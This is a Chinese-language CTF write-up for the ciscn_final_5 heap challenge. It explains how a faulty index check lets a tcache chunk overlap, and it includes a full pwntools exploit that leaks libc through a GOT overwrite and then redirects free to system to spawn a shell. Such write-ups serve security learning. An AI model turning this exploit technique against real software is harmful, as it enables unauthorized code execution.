边界检查不严格造成的overlap,这个题存储的方式比较奇怪，然后没开PIE和got表保护，可能是平衡一下吧哈哈哈。

先上代码

漏洞在这里，当选择index为16的时候 0x1000和buf进行或操作，那么tcache的管理器是0x250，如果我们的第一个chunk选择index16的话，那么就是0x10| 0x260在最低四位的结果也就是0x270，本来函数的本意是用后三位也就是最后一个有效16进制位来进行保护index，可是16导致了越界，使得free0x270处的freechunk，而tcache检查不严格，导致可以伪造chunk构造overlap。

这里有两种思路，我一开始用的是第一种。

第一

  • 首先伪造fake chunk 然后free
  • 然后malloc一个0x10大小的chunk，和一个稍微大一点的但是和fake chunk不一样大的chunk，来保证以后malloc出来不和topchunk合并了。这里本来tcache不会合并的，但是伪造的chunk malloc出来的时候就会。。。我也不知道为什么
  • 然后就是free这个0x10的chunk，然后把fake_chunk malloc出来
  • 然后可以利用这个fake chunk写0x10这个chunk的next指针，这样就可以malloc到free_got和puts_plt进行泄露。然后就可以getshell了

但是这种方法一直没打通，改了free的got表之后，想要泄露，但是一直报错，也不知道为什么

t调试了一下，发现，每次泄露的是got表的指针地址，所以要先泄露，再覆盖才行的通欸，但是这样有点难构造。。。

第二

这种要好一点

基本一样，但是利用了一个double free，劫持chunk到数组，然后在数组里面实现劫持got表

exp

from pwn import *

r = remote("node3.buuoj.cn", 27864)
#r = process("./ciscn_final_5")

context.log_level = 'debug'
context.terminal=['tmux','split','-h']

elf = ELF("./ciscn_final_5")
libc = ELF('./18buu64-libc-2.27.so')

content = 0x6020e0
free_got=0x602018
puts_plt=0x400790
puts_got=0x602020
atoi_got=0x602078

def add(index, size, content):
   r.recvuntil("your choice: ")
   r.sendline('1')
   r.recvuntil("index: ")
   r.sendline(str(index))
   r.recvuntil("size: ")
   r.sendline(str(size))
   r.recvuntil("content: ")
   r.send(content)

def delete(index):
   r.recvuntil("your choice: ")
   r.sendline('2')
   r.recvuntil("index: ")
   r.sendline(str(index))


def edit(index, content):
   r.recvuntil("your choice: ")
   r.sendline('3')
   r.recvuntil("index: ")
   r.sendline(str(index))
   r.recvuntil("content: ")
   r.send(content)


add(16,0x10,p64(0)+p64(0x90))
pause()
add(1, 0xc0, 'aa\n')
pause()
delete(0)
pause()
delete(1)

pause()
add(2, 0x80, p64(0)+p64(0x21)+p64(content))
add(3, 0xc0, 'aaa\n')
add(4, 0xc0, p64(free_got)+p64(puts_got+1)+p64(atoi_got-4)+p64(0)*17+p32(0x10)*8)
edit(8,p64(puts_plt)*2)
delete(1)
puts = u64(r.recv(6).ljust(8, '\x00'))
success("puts:"+hex(puts))
libc_base = puts - libc.symbols['puts']
system = libc_base + libc.sym['system']
edit(4, p64(system)*2)
r.recvuntil("your choice: ")
r.sendline('/bin/sh\x00')
r.interactive()

通过0xd0大小的chunk，申请到了数组，然后利用edit去修改数组内的got指针，达到劫持的目的。

这里的尾数设置其实和程序机制有关系，程序free的时候和edit的时候都只会查看最后一位来确定index，所以要puts+1来避免，然后free的时候有个&操作会省略最后一位，所以构造了如exp的数组。
